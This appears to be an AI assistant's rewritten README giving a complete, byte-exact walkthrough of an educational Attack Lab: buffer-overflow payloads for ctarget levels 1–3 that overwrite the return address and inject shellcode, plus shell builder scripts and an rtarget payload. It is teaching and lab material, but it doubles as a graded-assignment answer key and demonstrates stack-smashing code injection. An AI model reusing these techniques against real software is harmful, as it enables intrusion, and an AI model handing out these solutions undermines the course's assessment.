Below is a tightened, corrected, and slightly more readable version of your README with minimal changes — same structure and all technical details preserved, but clearer wording, fixed typos, and a couple of explicit runtime reminders. Copy/paste to replace the old README.

---

# Attack Lab — README for Targets 1, 2, and 3 (on `ctarget`)

This guide is a **practical, step-by-step** walkthrough for solving the first three levels on `ctarget`:

* **Target 1** → redirect return to `target_f1`
* **Target 2** → code-inject to set `%edi = cookie` then call `target_f2`
* **Target 3** → code-inject to set `%rdi` to a pointer to the string `"10fcf2b0\0"` then call `target_f3`

Everything below is reproducible with `gdb`, `objdump`, and the provided `hex2raw` converter.

---

## Global facts you’ll use

* Vulnerable function (from your disassembly):

```asm
00000000004016b3 <getbuf>:
 4016b3: 48 83 ec 38    sub $0x38,%rsp   ; allocate 56 bytes for buf
 4016b7: 48 89 e7       mov %rsp,%rdi    ; rdi = buf
 4016ba: e8 ...         call Gets
 4016c4: 48 83 c4 38    add  $0x38,%rsp
 4016c8: c3             ret
```

→ **Overflow size** from start of `buf` to the saved return address is **N = 0x38 = 56 bytes** (for this binary). **Always verify** on your compiled binary because some builds save RBP; that makes the distance 56 + 8 = 64 bytes.

* Target function addresses (confirm on your binary):

  * `target_f1 = 0x40177f`
  * `target_f2 = 0x4017af`
  * `target_f3 = 0x401883`

* Your cookie prints at program start (e.g., `0x10fcf2b0`). Use **your** cookie value in the payload.

* **hex2raw expects hex bytes** (`41`, `7f`, …) separated by whitespace. Do **not** feed ASCII like `AAAAAAAA…`.

---

## How to measure the buffer start (`B`) exactly (once)

You need the address of the start of `buf` **at runtime**:

```gdb
gdb ./ctarget
(gdb) break getbuf
(gdb) run [args if any]
# step to just after 'sub $0x38,%rsp' and before 'call Gets'
(gdb) ni
(gdb) ni
(gdb) printf "B = %#018lx\n", $rsp
```

Record that as **B**, e.g. `B = 0x0000000054f8b198`. Little-endian 8-byte form: `98 B1 F8 54 00 00 00 00`.

> **Why:** After we overwrite the saved RIP with `B`, `ret` will jump to `B` and begin executing your injected bytes in the buffer.

---

## How to assemble your final files

For each solution file (`sol1.txt`, `sol2.txt`, `sol3.txt`), write:

```
[PAYLOAD BYTES IN HEX, SPACE-SEPARATED]
```

Then run/grade:

```bash
cat solX.txt | ./hex2raw | ./ctarget
./grade
```

Avoid embedding the hex byte `0a` (newline) inside the payload; the file’s final line break is fine.

---

# Target 1 — Redirect return to `target_f1`

**Goal:** Overwrite saved return address so `getbuf` returns directly into `target_f1`. No arguments required.

### Payload build

* Overflow padding: **56 bytes** of any non-`0a` byte (commonly `41`).
* Saved return address: 8 bytes, **little-endian** of `target_f1`:

  * `target_f1 = 0x40177f` → `7f 17 40 00 00 00 00 00`

**`sol1.txt` structure:**

```
[ 56 × 41 ]
[ 7f 17 40 00 00 00 00 00 ]
```

**Run:**

```bash
cat sol1.txt | ./hex2raw | ./ctarget
./grade
```

**Pitfalls:** wrong endianness, wrong byte count, newline inside payload.

---

# Target 2 — Inject code to set `%edi = cookie`, then call `target_f2`

**Goal:** When `target_f2` runs, `%edi` must equal your cookie (e.g., `0x10fcf2b0`).

We will return into the buffer and execute a short instruction sequence that sets `%edi` and then transfers control to `target_f2`.

### Minimal injected code (11 bytes)

We use `mov imm32 → %edi` and `push imm32; ret` to jump:

```asm
mov  $0x10fcf2b0, %edi    ; BF B0 F2 FC 10
push  $0x4017af           ; 68 AF 17 40 00
ret                      ; C3
```

* Bytes: `BF B0 F2 FC 10  68 AF 17 40 00  C3`
* Length **C = 11 bytes**
* Overflow padding: `56 − 11 = 45` bytes of `41`
* Saved return address: **B** (8 bytes little-endian) — so `ret` jumps into your injected code at buffer start.

**`sol2.txt` structure:**

```
[ BF B0 F2 FC 10  68 AF 17 40 00  C3 ]
[ 45 × 41 ]
[ B (8 bytes little-endian) ]
```

**Run:**

```bash
cat sol2.txt | ./hex2raw | ./ctarget
./grade
```

**If it fails:** re-measure **B** (after `sub $0x38,%rsp`), re-count padding, verify cookie, and check endianness.

---

# Target 3 — Inject a string argument for `hexmatch` then call `target_f3`

**Goal:** `target_f3` calls `hexmatch(cookie, rdi)`. You must set `%rdi` to point to the NUL-terminated lowercase string `"10fcf2b0\0"`.

### Where to place the string

When `getbuf` returns and execution jumps to `B`, `ret` has already popped the saved RIP; therefore `RSP = B + 64` (when the saved RIP was at `B + 56` — confirm for your build). We will place the string **immediately after** the saved RIP (i.e., at `B + 64`). Then a `mov rdi, rsp` executed at `B` will set `%rdi` to that string address.

### Injected code (Option A — recommended, rsp-relative, 9 bytes)

```asm
mov rdi, rsp            ; 48 89 E7
push $0x401883          ; 68 83 18 40 00
ret                     ; C3
```

* Bytes: `48 89 E7  68 83 18 40 00  C3`
* Length **C = 9 bytes**
* Overflow padding: `56 − 9 = 47` bytes of `41`
* Saved return address = **B** (8 bytes LE)
* String bytes: `"10fcf2b0\0"` → `31 30 66 63 66 32 62 30 00`

**`sol3.txt` structure (Option A):**

```
[ 48 89 E7  68 83 18 40 00  C3 ]    ; code (9B)
[ 47 × 41 ]                          ; padding
[ B (8 bytes LE) ]                   ; saved RIP → code at B
[ 31 30 66 63 66 32 62 30 00 ]       ; "10fcf2b0\0" at RSP (B+64)
```

### (Option B — absolute pointer, 16 bytes)

Compute `S = B + 64` and encode:

```asm
movabs rdi, S           ; 48 BF <S(8B LE)>
push   $0x401883        ; 68 83 18 40 00
ret                     ; C3
```

* Length **C = 16 bytes**
* Padding = `56 − 16 = 40` bytes of `41`
* Then `[ B (8 bytes LE) ]` and the string bytes follow.

**Run:**

```bash
cat sol3.txt | ./hex2raw | ./ctarget
./grade
```

---

## Worked byte example (replace with your B)

Suppose:

```
B = 0x0000000054f8b198  →  little-endian: 98 B1 F8 54 00 00 00 00
```

**Target 1**

```
[56×41] 7f 17 40 00 00 00 00 00
```

**Target 2**

```
BF B0 F2 FC 10 68 AF 17 40 00 C3
[45×41]
98 B1 F8 54 00 00 00 00
```

**Target 3 (Option A)**

```
48 89 E7 68 83 18 40 00 C3
[47×41]
98 B1 F8 54 00 00 00 00
31 30 66 63 66 32 62 30 00
```

Example shell builder (Target 3, Option A):

```bash
# build sol3.txt
printf '48 89 E7 68 83 18 40 00 C3 ' > sol3.txt
for i in $(seq 1 47); do printf '41 ' >> sol3.txt; done
printf '98 B1 F8 54 00 00 00 00 ' >> sol3.txt
printf '31 30 66 63 66 32 62 30 00\n' >> sol3.txt

cat sol3.txt | ./hex2raw | ./ctarget
./grade
```

---

## Teaching notes & common pitfalls

* **Endianness matters:** All 64-bit addresses in the payload must be **little-endian**.
* **Lowercase hex and NUL:** `hexmatch` expects **lowercase** 8-hex digits and compares **9 bytes** (including the terminating NUL).
* **Don’t use ASCII letters in `sol*.txt`:** Always hex bytes (`41`, not `A`).
* **Offset is specific to this binary:** We used `N = 56` because `getbuf` does `sub $0x38,%rsp`. Always check your binary’s disassembly.
* **Measure `B` correctly:** Capture `$rsp` **after** `sub $0x38,%rsp` and **before** `call Gets`.
* **No stray `0a`:** Don’t place a newline byte inside the payload. EOF line break is fine.

---

## Quick checklists

**Target 1**

* [ ] N = 56
* [ ] 56×`41` then `target_f1` (LE)
* [ ] `./grade` shows Level 1

**Target 2**

* [ ] Code (11B): `BF B0 F2 FC 10 68 AF 17 40 00 C3`
* [ ] Padding 45×`41`
* [ ] Saved RIP = `B` (LE)
* [ ] `./grade` shows Level 2

**Target 3 (Option A)**

* [ ] Code (9B): `48 89 E7 68 83 18 40 00 C3`
* [ ] Padding 47×`41`
* [ ] Saved RIP = `B` (LE)
* [ ] String `"10fcf2b0\0"` at the end
* [ ] `./grade` shows Level 3

---

## RTarget (brief)

To get `rtarget`’s Level 1, the same idea applies: overwrite the saved RIP so `getbuf` returns into `target_f1` in that binary.

Example disassembly snippet:

```asm
00000000004016d3 <getbuf>:
 4016d3: 48 83 ec 38      sub $0x38,%rsp   ; 56 bytes
 4016d7: 48 89 e7         mov %rsp,%rdi
 4016da: e8 62 00 00 00   call 401741 <Gets>
 4016df: b8 01 00 00 00   mov $0x1,%eax
 4016e4: 48 83 c4 38      add $0x38,%rsp   ; same 0x38
 4016e8: c3                ret
```

* `target_f1` in `rtarget` is at `0x40179f`.
* Payload (assuming 56-byte padding):

```bash
# 56 bytes padding, then 8-LE-of-0x40179f
printf '\x41%.0s' $(seq 1 56) > /tmp/payload.bin
printf '\x9f\x17\x40\x00\x00\x00\x00\x00' >> /tmp/payload.bin
./rtarget < /tmp/payload.bin
```

**Note about ROP:** if the stack is non-executable (NX/DEP), you must switch to a ROP-chain approach (use gadgets and `ret`-sequences) rather than injected code on the stack.

